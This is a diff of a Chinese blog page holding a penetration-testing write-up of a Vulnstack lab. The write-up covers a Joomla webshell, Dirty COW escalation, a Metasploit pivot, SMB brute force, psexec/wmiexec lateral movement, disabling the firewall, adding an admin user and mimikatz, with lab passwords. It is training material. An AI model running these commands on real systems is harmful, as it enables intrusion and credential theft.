@@ -25,7 +25,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/failure.ico">
 <meta property="article:published_time" content="2024-03-24T07:47:05.000Z">
-<meta property="article:modified_time" content="2024-03-24T14:28:28.222Z">
+<meta property="article:modified_time" content="2024-03-24T14:29:05.599Z">
 <meta property="article:author" content="Err0r2333">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary">
@@ -195,7 +195,7 @@
             
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                 <div class="icon"><i class="fa fa-warning"></i></div>
-                <div class="text"><p>本文最后编辑于 <time datetime="1711290508222"></time> 前，其中的内容可能需要更新。</p></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1711290545599"></time> 前，其中的内容可能需要更新。</p></div>
             </div>
             
             
@@ -205,13 +205,13 @@
 <span id="more"></span>
 <h1><span id="环境配置"> 环境配置</span></h1>
 <p>这次需要配一张192.168.93.0的VMnet2网卡</p>
-<img src="/posts/undefined/1.png" class title="awa">
+<img src="/posts/8341/1.png" class title="awa">
 <p>然后把centos的网卡多设置一张NAT模式的就好了</p>
-<img src="/posts/undefined/2.png" class title="awa">
+<img src="/posts/8341/2.png" class title="awa">
 <p>把NAT改回111网段了</p>
 <p>centos运行的时候要重新获取桥接模式的网卡ip：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ifdown eth0</span><br><span class="line">ifup eth0</span><br><span class="line">ip a</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/3.png" class title="awa">
+<img src="/posts/8341/3.png" class title="awa">
 <p>总览</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">5台机</span><br><span class="line">centos</span><br><span class="line">ubuntu</span><br><span class="line">win7</span><br><span class="line">win2008</span><br><span class="line">win2012</span><br><span class="line"></span><br><span class="line">本次测试为黑盒测试，所以所有主机都为挂起状态，且账号都默认已经登录。</span><br><span class="line">在域控内有一份文件</span><br></pre></td></tr></table></figure>
 <h1><span id="开打"> 开打</span></h1>
@@ -219,51 +219,51 @@
 <p>现在啥都不知道，只能够对192.168.31.168进行渗透</p>
 <p>wappalyzer显示是一个joomla的cms</p>
 <p>kscan扫端口，dirsearch扫目录：</p>
-<img src="/posts/undefined/4.png" class title="awa">
+<img src="/posts/8341/4.png" class title="awa">
 <p>扫出端口如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh 22</span><br><span class="line">web 80</span><br><span class="line">mysql 3306</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/5.png" class title="awa">
+<img src="/posts/8341/5.png" class title="awa">
 <p>发现<code>configuration.php~</code>，里面有sql的密码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cvcvgjASD!@</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/6.png" class title="awa">
+<img src="/posts/8341/6.png" class title="awa">
 <p><code>administrator</code>有后台</p>
 <p>尝试弱密码爆破(top3000)后台</p>
 <p>爆破不了，不是弱密码</p>
 <p>查找到2023的cve，发现不行</p>
 <h2><span id="外网渗透"> 外网渗透</span></h2>
 <p>这边用navicat连一下数据库：</p>
-<img src="/posts/undefined/7.png" class title="awa">
+<img src="/posts/8341/7.png" class title="awa">
 <p>连上以后找一下有没有管理员的密码(搜一下users)</p>
 <p>这边在<code>am2zu_users</code>里找到了</p>
-<img src="/posts/undefined/8.png" class title="awa">
+<img src="/posts/8341/8.png" class title="awa">
 <p>但是密码不是明文，这就有点难办了。这边查了一下joomla的管理员密码，发现有</p>
-<img src="/posts/undefined/9.png" class title="awa">
+<img src="/posts/8341/9.png" class title="awa">
 <p>可以试试</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199</span><br></pre></td></tr></table></figure>
 <p>改完之后用<code>administrator secret</code>进来了</p>
-<img src="/posts/undefined/10.png" class title="awa">
+<img src="/posts/8341/10.png" class title="awa">
 <p>接下来就是随便找个地方传shell了</p>
 <p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2378001">Joomla后台模板Getshell技巧-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
 <p><code>Extensions - Templates - Templates -选择error.php文件</code></p>
-<img src="/posts/undefined/11.png" class title="awa">
+<img src="/posts/8341/11.png" class title="awa">
 <p>写了个一句话木马，这里在左上角可以看到<code>error.php in beez3</code></p>
 <p>然后访问：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://ip/joomla/templates/beez3/error.php</span><br><span class="line">http://ip/templates/beez3/error.php</span><br></pre></td></tr></table></figure>
 <p>蚁剑连接：</p>
-<img src="/posts/undefined/12.png" class title="awa">
+<img src="/posts/8341/12.png" class title="awa">
 <p>虚拟终端打whoami返回ret=127，说明没权限</p>
 <p>这边直接用蚁剑的<code>bypassdisablefunction</code>绕过</p>
-<img src="/posts/undefined/13.png" class title="awa">
+<img src="/posts/8341/13.png" class title="awa">
 <p>用这个<code>GG UAF</code>就可以了</p>
-<img src="/posts/undefined/14.png" class title="awa">
+<img src="/posts/8341/14.png" class title="awa">
 <p>但是用不了ifconfig</p>
 <p>所以这边换成LD_PRELOAD</p>
-<img src="/posts/undefined/16.png" class title="awa">
+<img src="/posts/8341/16.png" class title="awa">
 <p>连到<code>.antproxy.php</code>，密码是刚刚的cmd</p>
 <p>这下ok了</p>
 <h3><span id="内网信息收集"> 内网信息收集</span></h3>
 <p><code>ifconfig</code>一下：</p>
-<img src="/posts/undefined/17.png" class title="awa">
+<img src="/posts/8341/17.png" class title="awa">
 <p>发现离谱的是地址居然是<code>192.168.93.120</code></p>
 <p>而不是我们的<code>192.168.31.168</code></p>
 <p>也就是说我们的<code>192.168.31.168</code>是公网ip，而<code>192.168.93.120</code>是内网的ip</p>
@@ -275,11 +275,11 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adduser wwwuser</span><br><span class="line">passwd wwwuser_123Aqx</span><br></pre></td></tr></table></figure>
 <p>用linux的大概都知道，这里的意思就是新增了一个用户<code>wwwuser</code>，密码是<code>wwwuser_123Aqx</code>，这里可以通过SSH连接</p>
 <p>进来了</p>
-<img src="/posts/undefined/18.png" class title="awa">
+<img src="/posts/8341/18.png" class title="awa">
 <p>连进ssh以后就可以想办法提权了</p>
 <p>看一下有没有find的提权：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/19.png" class title="awa">
+<img src="/posts/8341/19.png" class title="awa">
 <p>没得，看内核</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux MiWiFi-R4CM-srv 2.6.32-431.el6.x86_64 #1 SMP Fri Nov 22 03:15:09 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>
 <p>2.6.32，可以用脏牛：</p>
@@ -290,13 +290,13 @@
 <p>这边直接用terminus的sftp传dirty.c</p>
 <p>gcc编译</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/20.png" class title="awa">
+<img src="/posts/8341/20.png" class title="awa">
 <p>然后</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su rooter</span><br><span class="line">Hello@World</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/21.png" class title="awa">
+<img src="/posts/8341/21.png" class title="awa">
 <h2><span id="msf上线"> msf上线</span></h2>
 <p>重新执行一下这个shell</p>
-<img src="/posts/undefined/22.png" class title="awa">
+<img src="/posts/8341/22.png" class title="awa">
 <p>上线成功</p>
 <p>简单添加一下路由和socks4代理。这里的内网端我们已经通过<code>ifconfig</code>扫出来是<code>192.168.93.0</code>端了</p>
 <p>添加路由：</p>
@@ -306,7 +306,7 @@
 <p>proxychains扫192.168.93端</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap 192.168.93.0 -sT -Pn</span><br></pre></td></tr></table></figure>
 <p>…不知道是不是命令输错了，建议用msf的<code>udp_probe</code>模块探测：</p>
-<img src="/posts/undefined/23.png" class title="awa">
+<img src="/posts/8341/23.png" class title="awa">
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/udp_probe</span><br><span class="line">set rhosts 192.168.93.0/24</span><br><span class="line">set threads 20</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 <p>这里解决了之前在<code>Vulnstack2</code>里的运行过慢问题，就是要提高线程(((</p>
 <p>这里探测出了：</p>
@@ -314,23 +314,23 @@
 <p>proxychains上nmap继续扫：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap 192.168.93.x -sT -Pn</span><br></pre></td></tr></table></figure>
 <p>10段扫的比较慢</p>
-<img src="/posts/undefined/26.png" class title="awa">
-<img src="/posts/undefined/24.png" class title="awa">
-<img src="/posts/undefined/25.png" class title="awa">
+<img src="/posts/8341/26.png" class title="awa">
+<img src="/posts/8341/24.png" class title="awa">
+<img src="/posts/8341/25.png" class title="awa">
 <p>后面直接就timeout了，无敌，等他扫完要20分钟？？？</p>
 <p>扫出来以后发现三台都有445，试试永恒之蓝能不能和他爆了</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"></span><br><span class="line">use auxiliary/admin/smb/ms17_010_command #好像要用正向链接的</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/26.png" class title="awa">
+<img src="/posts/8341/26.png" class title="awa">
 <p>全部用不了，但是我们可以知道他们的系统是啥：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10 Windows server 2012 R2</span><br><span class="line">20 Windows Server 2008 Service Pack 2</span><br><span class="line">30 Win7 service pack 1</span><br></pre></td></tr></table></figure>
 <p>不能用永恒之蓝爆，换一种方式，用smb连接。爆一下smb密码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_login</span><br><span class="line">set rhost 192.168.93.10</span><br><span class="line">set pass_file top1000.txt</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/27.png" class title="awa">
+<img src="/posts/8341/27.png" class title="awa">
 <p>域控密码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zxcASDqw123!!</span><br></pre></td></tr></table></figure>
 <p>爆20:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set rhost 192.168.93.20</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/28.png" class title="awa">
+<img src="/posts/8341/28.png" class title="awa">
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123qwe!ASD</span><br></pre></td></tr></table></figure>
 <p>爆30：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set rhost 192.168.93.30</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
@@ -342,12 +342,12 @@
 <p>用smb模块的psexec上线就好了，上线一台直接派生去cs爆</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use windows/smb/psexec</span><br><span class="line">set rhost 192.168.93.10</span><br><span class="line">set SMBUSER administrator</span><br><span class="line">set SMBPASS zxcASDqw123!!</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 <p>10的进不去</p>
-<img src="/posts/undefined/29.png" class title="awa">
+<img src="/posts/8341/29.png" class title="awa">
 <p>试试20和30的</p>
 <p>20的能连，meterpreter弹过来了</p>
-<img src="/posts/undefined/30.png" class title="awa">
+<img src="/posts/8341/30.png" class title="awa">
 <p>能连</p>
-<img src="/posts/undefined/31.png" class title="awa">
+<img src="/posts/8341/31.png" class title="awa">
 <p>还是system权限</p>
 <p>这边迁移到explorer.exe(PID 3800)</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate 3800</span><br></pre></td></tr></table></figure>
@@ -364,23 +364,23 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 wmiexec-pro.py username:password@target_ip </span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 wmiexec-pro.py &#x27;administrator:zxcASDqw123!!@192.168.93.10&#x27; exec-command -shell</span><br></pre></td></tr></table></figure>
 <p>拿到shell：</p>
-<img src="/posts/undefined/34.png" class title="awa">
+<img src="/posts/8341/34.png" class title="awa">
 <p>同样的操作关防火墙开3389</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br><span class="line"></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/35.png" class title="awa">
+<img src="/posts/8341/35.png" class title="awa">
 <p>拿下</p>
 <p>最后一台</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 wmiexec-pro.py &#x27;administrator:123qwe!ASD@192.168.93.30&#x27; exec-command -shell</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/36.png" class title="awa">
+<img src="/posts/8341/36.png" class title="awa">
 <p>拿下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br><span class="line"></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/37.png" class title="awa">
+<img src="/posts/8341/37.png" class title="awa">
 <p>这边还连不上，显示untrusted，这边试试添加一个用户：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net user err0r hongrisec@2019 /add</span><br><span class="line">net localgroup administrators err0r /add</span><br><span class="line">net user err0r</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/38.png" class title="awa">
+<img src="/posts/8341/38.png" class title="awa">
 <p>OK了</p>
 <p>看一下域控里的文件就好了，flag在<code>C:\\Users\\Administrator\\Docunments</code></p>
-<img src="/posts/undefined/39.png" class title="awa">
+<img src="/posts/8341/39.png" class title="awa">
 <p>这里如果只爆出一个密码的话，可以传mimikatz然后<code>serkurlsa::logonpasswords</code></p>
 <p>注意如果是win2012的机子的话，需要</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">log</span><br><span class="line">privilege::debug</span><br><span class="line">serkurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
@@ -475,7 +475,7 @@
                     <a class="tag-none-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a>
                 </div>
                 <div class="pull-date">
-                    <time datetime="2024-03-24T14:28:28.222Z" itemprop="dateModified">最后编辑：2024-03-24</time>
+                    <time datetime="2024-03-24T14:29:05.599Z" itemprop="dateModified">最后编辑：2024-03-24</time>
                 </div>
             </div>
         </footer>
